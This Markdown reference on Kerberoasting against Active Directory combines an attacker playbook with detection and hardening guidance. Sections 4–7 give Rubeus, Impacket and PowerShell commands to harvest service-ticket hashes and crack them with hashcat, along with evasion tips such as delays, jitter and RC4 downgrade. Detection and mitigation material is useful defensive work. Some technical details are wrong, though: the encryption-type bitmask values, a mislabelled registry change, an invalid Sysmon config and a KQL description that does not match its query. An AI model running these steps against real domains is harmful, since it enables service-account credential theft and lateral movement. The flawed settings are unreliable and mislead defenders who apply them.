# [CA-KERB-001]: Kerberoasting - Weak Service Account Credential Theft

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-001 |
| **MITRE ATT&CK v18.1** | [T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD (Server 2016, 2019, 2022, 2025); On-premises domains |
| **Severity** | Critical |
| **CVE** | N/A (Protocol abuse, not CVE-dependent) |
| **Author** | SERVTEP (Pchelnikau Artur) |
| **File Path** | 03_Cred/CA-KERB-001_Kerberoasting.md |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | Windows Server 2016-2025, Active Directory Functional Level 2008+ |
| **Patched In** | RC4 disabled by default in Windows 11 24H2 and Server 2025 (Q2 2026 planned) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 4 (Environmental Reconnaissance), 8 (Splunk Detection), 10 (Sysmon Detection), 12 (Microsoft Defender for Cloud), and 13 (Microsoft Purview) have been dynamically adjusted to focus on Windows AD on-premises environments where Kerberoasting is most prevalent.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Kerberoasting is a credential access attack that exploits the normal Kerberos authentication protocol in Windows Active Directory. An authenticated domain user (even with minimal privileges) can request service tickets (TGS—Ticket Granting Service) for any Service Principal Name (SPN) registered in Active Directory. These tickets are encrypted using the service account's password hash. An attacker extracts these tickets from memory or network traffic, then performs offline brute-force attacks to recover the plaintext password, enabling unauthorized access to service accounts that often hold elevated privileges.

**Attack Surface:** Service accounts with registered SPNs, specifically those using RC4 encryption (etype 0x17). Modern environments default to AES-128/256, but RC4 remains enabled by default (until Q2 2026 deprecation). The Kerberos protocol itself is not vulnerable; the vulnerability stems from weak encryption and password policies on service accounts.

**Business Impact:** **Service account credential compromise leads to privilege escalation, lateral movement, and persistent access.** Compromised service accounts running SQL Server, SharePoint, or web applications provide direct access to sensitive data and systems. Ransomware groups (Conti, FIN7, Wizard Spider) consistently leverage Kerberoasting post-exploitation to move laterally before encryption/exfiltration.

**Technical Context:** Kerberoasting requires no special network access—a regular authenticated domain user can enumerate and request tickets locally or remotely over port 88 (Kerberos). The attack is **silent**: TGS requests appear as normal domain activity. Detection relies on identifying anomalous volume or patterns of TGS requests (Event ID 4769) rather than a single "smoking gun" event. Password cracking speed has increased dramatically with GPU acceleration, making even moderately complex passwords vulnerable within hours.

### Operational Risk
- **Execution Risk:** Low - No administrator rights required; pure protocol abuse. Can be executed from any domain-joined machine.
- **Stealth:** Medium - Volume-based detection (multiple RC4 TGS requests in 5 minutes) is possible; single requests blend with legitimate activity.
- **Reversibility:** No - Once credentials are compromised, the attacker has obtained permanent or semi-permanent access to the service account unless the password is immediately reset.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.3.1.3, 5.3.1.4 | Ensure 'Do Not Allow Kerberos Delegations' and enforce AES encryption types for Kerberos authentication |
| **DISA STIG** | WN16-AU-000440, WN19-AU-000440 | Ensure Advanced Audit Policy Configuration – Account Logon events are recorded |
| **CISA SCuBA** | ID.AM-2, PR.AC-1 | Asset Management; Identify and Manage Access |
| **NIST 800-53** | AC-3 (Access Enforcement), IA-2 (Authentication), IA-5 (Authentication and Password Controls), IA-7 (Cryptography) | Enforce access controls; require AES encryption; ensure strong password policies |
| **GDPR** | Art. 32 (Security of Processing), Art. 5 (Data Protection Principles) | Technical measures to ensure encryption and confidentiality of authentication credentials |
| **DORA** | Art. 9 (Protection and Prevention), Art. 10 (Detection and Response) | Manage third-party service account risks; detect unauthorized credential access |
| **NIS2** | Art. 21 (Cyber Risk Management Measures), Art. 23 (Access Control) | Implement encryption; manage identity and access; monitor for unauthorized access patterns |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights), A.9.4.2 (Password Management) | Control service account privileges; enforce strong password policies; audit credential access |
| **ISO 27005** | Risk Scenario: "Compromise of Service Account Credentials" | Assess likelihood/impact of Kerberoasting; implement mitigations for service account password complexity |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Any authenticated domain user (no elevation). Domain membership required.
- **Required Access:** Network access to port 88 (Kerberos KDC) on Domain Controller(s). LDAP access (port 389/636) to enumerate SPNs.

**Supported Versions:**
- **Windows Server:** 2016, 2019, 2022, 2025
- **Active Directory Functional Level:** 2008 or higher
- **PowerShell:** 5.0+ (for native methods)
- **Impacket:** 0.10.0+ (for Linux-based enumeration)
- **Rubeus:** 2.0+ (latest v2.3.3)

**Tools:**
- [Rubeus](https://github.com/GhostPack/Rubeus) (v2.3.3 – C# tool for Kerberos interaction)
- [Impacket GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) (Python, cross-platform)
- [Hashcat](https://hashcat.net/hashcat/) (v6.2+, for cracking)
- [John the Ripper](https://www.openwall.com/john/) (Alternative cracking tool)
- PowerShell native `System.IdentityModel.Tokens.KerberosRequestorSecurityToken` class

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance (Windows-based)

#### 1. Enumerate SPNs in Domain

```powershell
# List all SPNs in the domain (no elevated rights needed)
setspn.exe -Q */*

# Alternative: PowerShell RSAT
Get-ADUser -Filter {servicePrincipalName -ne $null} -Properties servicePrincipalName | Select-Object Name, servicePrincipalName
```

**What to Look For:**
- Service accounts with multiple SPNs
- Accounts in "Domain Admins" or other privileged groups
- Legacy service accounts (old password last set dates)
- Accounts with RC4 encryption

#### 2. Check Encryption Types Supported by Service Accounts

```powershell
# Check which encryption types a service account supports
Get-ADUser -Identity "SQL_Service" -Properties msDS-SupportedEncryptionTypes | Select-Object msDS-SupportedEncryptionTypes

# Decrypt the bitmask:
# 1 = DES-CBC-CRC
# 4 = RC4-HMAC
# 8 = RESERVED
# 16 = AES128-CTS-HMAC-SHA1-96
# 32 = AES256-CTS-HMAC-SHA1-96
# If value is 31 or 30, RC4 is enabled; if 24, only AES is used
```

**Expected Output (Vulnerable):**
```
msDS-SupportedEncryptionTypes : 31  (DES + RC4 + AES128 + AES256)
```

**Expected Output (Hardened):**
```
msDS-SupportedEncryptionTypes : 24  (AES128 + AES256 only)
```

### LDAP/Command-Line Reconnaissance (Cross-platform)

#### Linux/Bash: Enumerate SPNs via LDAP

```bash
# Using ldapsearch (requires domain credentials)
ldapsearch -H ldap://dc.domain.local -D "CN=User,CN=Users,DC=domain,DC=local" -W \
  -b "DC=domain,DC=local" "servicePrincipalName=*" servicePrincipalName cn sAMAccountName

# Count total Kerberoastable accounts
ldapsearch -H ldap://dc.domain.local -D "CN=User,CN=Users,DC=domain,DC=local" -W \
  -b "DC=domain,DC=local" "servicePrincipalName=*" | grep -c "servicePrincipalName"
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Using Rubeus (Windows-based, Fastest)

**Supported Versions:** Server 2016-2025 (all versions)

#### Step 1: Enumerate Kerberoastable Accounts with Statistics

**Objective:** Identify all accounts with SPNs in the domain without requesting tickets (stealthier reconnaissance phase).

```powershell
Rubeus.exe kerberoast /stats /ldaps
```

**Expected Output:**
```
[*] Action: Kerberoasting
[+] Kerberoast stats:
     Kerberoastable Users  : 47
     RC4-Enabled Users     : 19
     AES-Enabled Users     : 28
     AdminCount=1 Users    : 8
```

**What This Means:**
- 47 service accounts are Kerberoastable (have SPNs)
- 19 use weak RC4 encryption (high priority targets)
- 8 are in privileged groups (high value targets)

**OpSec & Evasion:**
- `/stats` does NOT request tickets; it only enumerates and counts
- Detection likelihood: **Very Low** (no 4769 events generated)
- Safe to run for reconnaissance

**Version Note:** Identical behavior on Server 2016-2025.

#### Step 2: Request TGS Tickets for RC4-Enabled Accounts (OpSec Mode)

**Objective:** Extract service ticket hashes using the TGT delegation trick to request RC4 tickets from AES-only accounts (downgrade attacks).

```powershell
Rubeus.exe kerberoast /rc4opsec /nowrap
```

**Or, target specific admin accounts:**

```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /rc4opsec /nowrap
```

**Or, request with delay for stealth:**

```powershell
Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap /outfile:hashes.txt
```

**Expected Output (Partial):**
```
$krb5tgs$23$*sqlservice$DOMAIN.COM$MSSQLSvc/sqlserver.domain.com:1433*$...
$krb5tgs$23$*webservice$DOMAIN.COM$HTTP/webserver.domain.com*$...
```

**What This Means:**
- `$krb5tgs$23$` = RC4-HMAC hash format (crackable)
- `*sqlservice*` = Service account name
- Hash can be cracked offline using Hashcat (module 13100)

**OpSec & Evasion:**
- `/delay:5000` = 5-second delay between requests
- `/jitter:30` = 30% randomization of delay
- `/rc4opsec` = Uses TGT delegation trick (requests downgrade to RC4)
- Detection likelihood: **Medium** (if monitoring 4769 event volume)

**Troubleshooting:**

- **Error:** "Invalid credentials supplied."
  - **Cause:** User running Rubeus is not authenticated to the domain.
  - **Fix:** Ensure the user running Rubeus has valid domain credentials (check `whoami`, ensure domain-joined).

- **Error:** "No credentials or valid TGT."
  - **Cause:** No TGT loaded in the current session.
  - **Fix:** Run Rubeus from a domain-joined machine; if needed, use `/creduser:DOMAIN\USER /credpassword:PASSWORD`.

- **Error:** "Cannot determine encryption types; some accounts may be skipped."
  - **Cause:** LDAP query failed to retrieve `msDS-SupportedEncryptionTypes`.
  - **Fix:** Ensure LDAP connectivity; use `/dc:DOMAIN_CONTROLLER` to specify a DC.

**References & Proofs:**
- [Rubeus GitHub Documentation](https://github.com/GhostPack/Rubeus)
- [SpecterOps - From Kekeo to Rubeus](https://specterops.io/blog/2018/09/24/from-kekeo-to-rubeus/)
- [GhostPack Rubeus Tool](https://github.com/GhostPack/Rubeus/blob/master/README.md)

#### Step 3: Crack Hashes Offline Using Hashcat

**Objective:** Break the password hash to recover plaintext credentials.

```bash
# On a Linux machine with GPU (faster)
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Or with Hashcat on Windows (CPU-based, slower):**

```cmd
hashcat.exe -m 13100 hashes.txt rockyou.txt --force
```

**Expected Output:**
```
$krb5tgs$23$*sqlservice$...:Password123!  (Recovered!)
```

**What This Means:**
- Password for `sqlservice` account = `Password123!`
- Attacker can now authenticate as `sqlservice` to SQL Server or other services

**Version-Specific Notes:**
- Hashcat module 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
- AES hashes (module 19700) are slower to crack but vulnerable with weak passwords
- GPU acceleration: NVIDIA CUDA recommended (100x+ faster than CPU)

---

### METHOD 2: Using Impacket GetUserSPNs.py (Linux/Cross-platform)

**Supported Versions:** Server 2016-2025 (all versions)

#### Step 1: Install Impacket on Linux

```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -r requirements.txt
python3 -m pip install . --user
```

#### Step 2: Enumerate and Request SPN Tickets

**Objective:** List all SPNs and request TGS tickets for offline cracking.

```bash
# Basic enumeration (list SPNs only, no ticket request)
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/username:password

# Request tickets for all SPNs (returns in Hashcat format)
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/username:password -request

# Request tickets for a specific account
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/username:password -request-user sqlservice

# Save to file
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/username:password -request -outputfile tgs_tickets.txt
```

**Expected Output:**
```
ServicePrincipalName          Name              MemberOf
----------------------------  ---------------   -------
MSSQLSvc/sqlserver:1433       sqlservice        CN=Domain Admins
HTTP/webserver:80             webservice        CN=Service Accounts
LDAP/dc1:389                  LDAP_Service      N/A
```

**What This Means:**
- All accounts are enumerated by their SPN
- Group membership shows privilege level
- Impacket is ready to request tickets

#### Step 3: Extract Hashes for Cracking

```bash
# The -request flag outputs hashes in Hashcat format automatically
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/username:password -request > kerberoast_hashes.txt

# Verify hash format
head -5 kerberoast_hashes.txt
```

**Expected Output:**
```
$krb5tgs$23$*sqlservice$DOMAIN.COM$MSSQLSvc/sqlserver:1433*$8a...
$krb5tgs$23$*webservice$DOMAIN.COM$HTTP/webserver:80*$c2...
```

#### Step 4: Crack with Hashcat (Linux)

```bash
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -o cracked.txt --show
```

**OpSec & Evasion:**
- Impacket does not require compilation or binary upload (pure Python)
- Can be obfuscated or encoded for delivery
- Detection likelihood: **Medium** (LDAP queries + 4769 events on DC)

**Troubleshooting:**

- **Error:** "Connection refused on port 389"
  - **Cause:** LDAP port not accessible (firewall or DC offline).
  - **Fix:** Use `-ldaps` for LDAPS (port 636); check DC availability with `nmap -p 389,636 192.168.1.10`.

- **Error:** "Invalid credentials"
  - **Cause:** Username/password incorrect or format wrong.
  - **Fix:** Try `domain.com/username:password` or `username@domain.com:password`.

**References & Proofs:**
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [GetUserSPNs.py Documentation](https://tools.thehacker.recipes/impacket/examples/getuserspns.py.md)

---

### METHOD 3: Native PowerShell (Windows, No Tools Required)

**Supported Versions:** Server 2016-2025 (all versions with PowerShell 5.0+)

#### Step 1: Request TGS Tickets Using System.IdentityModel

**Objective:** Extract service tickets using built-in .NET classes (stealth—no external tool uploaded).

```powershell
# Enumerate and request tickets for ALL SPNs
Add-Type -AssemblyName System.IdentityModel
$SPNs = setspn.exe -T domain.local -Q */* | Select-String '^CN' -Context 0,1
foreach ($item in $SPNs) {
    $SPN = $item.Context.PostContext[0].Trim()
    try {
        $TGS = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
        Write-Host "[+] Obtained TGS for: $SPN"
    } catch {
        Write-Host "[-] Failed: $SPN - $_"
    }
}
```

**Expected Output:**
```
[+] Obtained TGS for: MSSQLSvc/sqlserver.domain.local:1433
[+] Obtained TGS for: HTTP/webserver.domain.local:80
[+] Obtained TGS for: LDAP/dc1.domain.local:389
```

**What This Means:**
- Tickets are now loaded in the current session's Kerberos ticket cache
- Tickets can be extracted via Mimikatz or Rubeus in the next step

#### Step 2: Extract Tickets from Memory via Mimikatz

```powershell
# First, obtain tickets (as shown above)
# Then, use Mimikatz to export:
# mimikatz # kerberos::list /export
# mimikatz # exit

# Or use Rubeus to extract and convert:
# Rubeus.exe dump /nowrap
```

**OpSec & Evasion:**
- Pure PowerShell: No binary uploaded, script-based
- Requires script block logging and AMSI to detect (not always enabled)
- Detection likelihood: **Low** if logging is not configured; **High** if script block logging enabled

**Version Note:** Identical across Server 2016-2025; behavior consistent.

**Troubleshooting:**

- **Error:** "Add-Type: Cannot load assembly System.IdentityModel"
  - **Cause:** System.IdentityModel not available (rare on modern Windows).
  - **Fix:** Ensure .NET Framework 3.5+ is installed; verify with `[System.Reflection.Assembly]::LoadWithPartialName("System.IdentityModel")`.

**References & Proofs:**
- [Microsoft: System.IdentityModel.Tokens Namespace](https://learn.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens)
- [Atomic Red Team: T1558.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md)

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

#### Atomic Test #1: Kerberoasting - PowerShell Native (T1558.003)

- **Atomic Test ID:** `a06ef45d-4989-4cb6-8b91-46460e29614a`
- **Test Name:** Kerberoasting Native PowerShell
- **Description:** Request Kerberos service tickets using PowerShell's built-in `System.IdentityModel.Tokens.KerberosRequestorSecurityToken`.
- **Supported Versions:** Server 2016+
- **Cleanup:** Tickets will expire naturally (TGT typically 10 hours, TGS 10 minutes).

**Execution:**
```powershell
# Run via Atomic Red Team
Invoke-AtomicTest T1558.003 -TestNumbers 1

# Or manually:
Add-Type -AssemblyName System.IdentityModel
setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

**Reference:** [Atomic Red Team Library - T1558.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.003/T1558.003.md)

---

## 7. TOOLS & COMMANDS REFERENCE

#### [Rubeus](https://github.com/GhostPack/Rubeus)

**Version:** 2.3.3 (Latest as of January 2026)  
**Minimum Version:** 2.0  
**Supported Platforms:** Windows (any version with .NET CLR)

**Installation:**
```cmd
# Download compiled binary
https://github.com/GhostPack/Rubeus/releases/download/v2.3.3/Rubeus.exe

# Or compile from source
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus\Rubeus
csc.exe /out:Rubeus.exe *.cs
```

**Key Commands:**
```powershell
# Enumerate vulnerable accounts (stats only, no tickets)
Rubeus.exe kerberoast /stats /ldaps

# Request RC4-encrypted tickets (weak, fast to crack)
Rubeus.exe kerberoast /rc4opsec /nowrap

# Target specific admin accounts
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Add evasion delays
Rubeus.exe kerberoast /delay:5000 /jitter:30 /outfile:hashes.txt

# Request AES tickets (stronger, but still vulnerable with weak passwords)
Rubeus.exe kerberoast /aes /nowrap
```

#### [Impacket](https://github.com/SecureAuthCorp/impacket)

**Version:** 0.11.0+ (Latest as of January 2026)  
**Minimum Version:** 0.10.0  
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**
```bash
pip3 install impacket
# Or from source:
git clone https://github.com/SecureAuthCorp/impacket.git && cd impacket && python3 -m pip install . --user
```

**Key Commands:**
```bash
# List all SPNs in domain
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/user:pass

# Request TGS tickets for all SPNs
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/user:pass -request

# Request for specific account
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/user:pass -request-user sqlservice

# Output to file
python3 GetUserSPNs.py -dc-ip 192.168.1.10 domain.com/user:pass -request -outputfile hashes.txt
```

#### [Hashcat](https://hashcat.net/hashcat/)

**Version:** 6.2+ (Latest as of January 2026)  
**Module:** 13100 (Kerberos 5 TGS-REP etype 23—RC4)  
**Mode:** Dictionary attack (-a 0), Hybrid (-a 6), Brute-force (-a 3)

**Installation:**
```bash
# Linux (NVIDIA CUDA)
apt-get install hashcat
# Or manual: https://hashcat.net/hashcat/

# Windows (pre-compiled)
# Download from https://hashcat.net/hashcat/
```

**Cracking Commands:**
```bash
# Dictionary attack (fastest)
hashcat -m 13100 -a 0 hashes.txt rockyou.txt

# With GPU acceleration
hashcat -m 13100 -a 0 -d 1 hashes.txt rockyou.txt

# Show cracked passwords
hashcat -m 13100 hashes.txt --show

# Save output to file
hashcat -m 13100 -a 0 hashes.txt rockyou.txt -o cracked.txt
```

---

## 8. MICROSOFT SENTINEL DETECTION

#### Query 1: Excessive Kerberos TGS Requests (RC4 Downgrade)

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID (4769), TicketEncryptionType (0x17=RC4), TargetUserName, TicketOptions
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To Versions:** All versions (Server 2016-2025) when Kerberos audit logging enabled

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType =~ "0x17"
| extend TicketEncryptionType = tostring(TicketEncryptionType)
| summarize
    TGS_Count = dcount(TargetUserName),
    RC4_Tickets = count(),
    RequestingUsers = dcount(SubjectUserName),
    DistinctServices = dcount(ServiceName)
    by Computer, bin(TimeGenerated, 5m)
| where TGS_Count >= 10 and RC4_Tickets >= 20
| project TimeGenerated, Computer, TGS_Count, RC4_Tickets, RequestingUsers, DistinctServices
```

**What This Detects:**
- **Line 1-3:** Filter for Event ID 4769 (TGS request) with RC4 encryption (0x17 = weak cipher)
- **Line 4-11:** Aggregate requests by DC in 5-minute windows; count TGS requests, unique services, users
- **Line 12:** Alert when a single user requests TGS for 10+ accounts with 20+ RC4 tickets in 5 minutes
- **High signal of:** Automated Kerberoasting tool (Rubeus, PowerView) in use

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **Rule templates**
3. Search for **"Kerberos"** or create **+ New rule** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Excessive Kerberos RC4 TGS Requests`
   - Description: `Detects potential Kerberoasting via RC4 downgrade attacks`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
6. **Alert enrichment (Entity mapping):**
   - Computer → Host → Hostname
   - SubjectUserName → Account → Name
7. **Incident settings Tab:**
   - Create incidents: **Enabled**
   - Group alerts into single incident: **By all entities**
8. **Automated response (Optional):**
   - Add playbook to isolate host or block user

#### Query 2: Service Ticket Requests for Privileged Accounts

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID 4769, TargetUserName (with adminCount=1)
- **Alert Severity:** Critical (if target is admin)
- **Frequency:** Every 10 minutes
- **Applies To Versions:** All versions

**KQL Query:**
```kusto
let admins = SecurityEvent
| where EventID == 4769
| where TargetUserName has_any ("Admin", "svc_", "Service")  // Customize to your environment
| distinct TargetUserName;

SecurityEvent
| where EventID == 4769
| where TargetUserName in (admins)
| summarize
    Total_TGS_Requests = count(),
    Unique_RequestingUsers = dcount(SubjectUserName),
    Encryption_Types = make_set(TicketEncryptionType)
    by TargetUserName, Computer, bin(TimeGenerated, 10m)
| where Total_TGS_Requests >= 5
| project TimeGenerated, TargetUserName, Computer, Total_TGS_Requests, Unique_RequestingUsers, Encryption_Types
```

**What This Detects:**
- Requests for service tickets for administrative accounts (high-value targets)
- Multiple requesters targeting the same admin account (distributed attack)
- Sudden increase in TGS requests for a specific service account

**Manual Configuration (PowerShell):**
```powershell
$RuleParams = @{
    DisplayName = "Kerberoasting - Privileged Account TGS Requests"
    Query = @'
    let admins = SecurityEvent
    | where EventID == 4769
    | where TargetUserName matches regex "(?i)(admin|svc_|Service)"
    | distinct TargetUserName;
    
    SecurityEvent
    | where EventID == 4769
    | where TargetUserName in (admins)
    | summarize Total_Requests=count() by TargetUserName, bin(TimeGenerated, 10m)
    | where Total_Requests >= 5
    '@
    Severity = "Critical"
    Enabled = $true
}

New-AzSentinelAlertRule -ResourceGroupName "rg-sentinel" -WorkspaceName "ws-sentinel" @RuleParams
```

---

## 9. WINDOWS EVENT LOG MONITORING

**Event ID: 4769 (Kerberos Service Ticket Request)**
- **Log Source:** Security
- **Trigger:** When a user/computer requests a service ticket (TGS) from the KDC
- **Filter Fields:** `TicketEncryptionType=0x17` (RC4), `Status=0x0` (Success), `TargetUserName` (service account), `ClientAddress` (source IP)
- **Applies To Versions:** Server 2016+ (with proper audit policy enabled)

### Manual Configuration via Group Policy

**Step 1: Enable Kerberos Audit Logging (All Domain Controllers)**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Forest → Domains → [YourDomain] → Domain Controllers → Default Domain Controllers Policy** (right-click → Edit)
3. Go to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Account Logon**
4. Enable: **Audit Kerberos Service Ticket Operations**
   - Set to: **Success and Failure**
5. Also enable: **Audit Kerberos Authentication Service**
6. Click **Apply** → **OK**
7. Close Group Policy Editor
8. Run `gpupdate /force` on all DCs

### Manual Configuration via PowerShell

```powershell
# On Domain Controller (elevated PowerShell)
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Kerberos Service Ticket Operations"
```

### Server 2025-Specific Configuration

```powershell
# Windows Server 2025 uses Enhanced Audit Policy
# Configure via secpol.msc (Local Security Policy) or Group Policy:
# Computer Configuration → Policies → Windows Settings → Security Settings → 
# Advanced Audit Policy Configuration → Audit Policies → Account Logon →
# ✓ Audit Kerberos Service Ticket Operations (Success)
# ✓ Audit Kerberos Authentication Service (Success)

# Or via Registry (Server 2025):
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kerberos\Parameters" `
  -Name "UserkeyLen" -Value 256 -PropertyType DWord -Force
```

### Manual Event Log Analysis

```powershell
# Export 4769 events from last 24 hours
wevtutil epl Security "C:\Logs\Security.evtx" /q:"*[System[(EventID=4769) and TimeCreated[timediff(@SystemTime) <= 86400000]]]"

# Parse 4769 events for RC4 usage
Get-WinEvent -FilterXPath "*[System[(EventID=4769)] and EventData[Data[@Name='TicketEncryptionType']='0x17']]" -LogName Security -MaxEvents 100 | 
  Select-Object TimeCreated, @{N="TargetAccount";E={$_.Properties[0].Value}}, @{N="RequestingUser";E={$_.Properties[1].Value}}, @{N="ServiceName";E={$_.Properties[3].Value}}
```

---

## 10. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+  
**Supported Platforms:** Windows (Server 2016-2025)

**Note:** Sysmon cannot directly monitor Kerberos protocol events (those are Windows Event Log events). However, Sysmon can detect the **process execution** of Kerberoasting tools.

```xml
<!-- Sysmon Config: Detect Rubeus Execution -->
<Sysmon schemaversion="4.80">
  <RuleGroup name="Kerberoasting Tool Execution">
    <!-- Detect Rubeus.exe in command line -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">rubeus.exe,rubeus,kerberoast,asktgt,asktgs</CommandLine>
      <ParentImage condition="contains any">cmd.exe,powershell.exe,pwsh.exe</ParentImage>
    </ProcessCreate>
    
    <!-- Detect GetUserSPNs.py execution via Python -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains any">GetUserSPNs.py,getuserspns,kerberoasting</CommandLine>
      <Image condition="ends with">python.exe,python3.exe</Image>
    </ProcessCreate>
  </RuleGroup>
  
  <!-- Detect LDAP queries for SPN enumeration -->
  <NetworkConnect onmatch="include">
    <DestinationPort condition="is">389</DestinationPort> <!-- LDAP -->
    <DestinationPort condition="is">636</DestinationPort> <!-- LDAPS -->
    <Image condition="contains any">rubeus,impacket,ldapsearch</Image>
  </NetworkConnect>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download latest Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-config.xml` with rules above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 11. FORENSIC ARTIFACTS & INDICATORS OF COMPROMISE

**Disk Artifacts:**
- Rubeus.exe, hashcat.exe, GetUserSPNs.py in `%TEMP%`, `%APPDATA%`, `C:\Windows\Temp\`
- PowerShell scripts (`.ps1` files) with KerberosRequestorSecurityToken or setspn commands
- Hash files output (`.txt`, `.csv` containing `$krb5tgs$23$`)
- Crack result files (`.txt` containing plaintext passwords)

**Registry Artifacts (Windows):**
- **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters**
  - `AllowedEncryptionTypes` (if modified to enable RC4)
  - `MaxTokenSize` (modified for large TGTs)

**Memory Artifacts (RAM Dumps):**
- Kerberos ticket cache in `lsass.exe` (contains TGT/TGS data)
- Rubeus or Mimikatz process memory (tool binaries + extracted tickets)
- Service account password hashes in LSASS (if Mimikatz executed)

**Event Log Artifacts (Windows Security):**
- **Event ID 4769:** Flood of TGS requests in short time window
- **Event ID 4768:** Correlated AS-REQ (TGT requests) before TGS storm
- **Event ID 4624:** Logon events for service accounts (unusual timing)
- **Event ID 4672:** Privileged access granted (if attacker escalated)

**Network Artifacts:**
- DNS queries for Domain Controller names (enumeration phase)
- Kerberos port 88 UDP/TCP traffic spike (volume anomaly)
- LDAP queries to port 389/636 for SPN enumeration

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable RC4 Encryption for Kerberos and Force AES**

RC4 is the primary target of Kerberoasting; eliminating it removes 80%+ of the attack surface.

**Applies To Versions:** Server 2016-2025

**Manual Steps (Group Policy - All Domain Controllers):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Forest → Domains → [YourDomain] → Domain Controllers → Default Domain Controllers Policy** (edit)
3. Go to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
4. Find: **Network security: Configure encryption types allowed for Kerberos**
5. Set to: **AES128_HMAC_SHA1, AES256_HMAC_SHA1** (uncheck DES, RC4, HMAC-MD5)
6. Click **Apply** → **OK**
7. Run: `gpupdate /force` on all DCs and member servers

**Or, via PowerShell on Domain Controller (Elevated):**

```powershell
# Set registry to disable RC4, enable AES only
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" `
  -Name "SupportedEncTypes" -Value 24 -Type DWord

# Value 24 = AES128 + AES256 only
# Value 23 = DES + RC4 + AES128 + AES256 (vulnerable)
# Value 31 = All types enabled (most vulnerable)
```

**Verification Command (Check if Secure):**

```powershell
# On Domain Controller
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" -Name SupportedEncTypes

# Expected output: 24 (AES-only, secure)
# Vulnerable output: 23, 28, 31 (RC4 enabled)
```

**Important:** After changing encryption types, **restart the Domain Controller** and **change the password of all service accounts** so their credentials are encrypted with AES, not RC4.

**Action 2: Migrate Service Accounts to Group Managed Service Accounts (gMSA)**

gMSA accounts have 120-character auto-generated passwords, making Kerberoasting impractical.

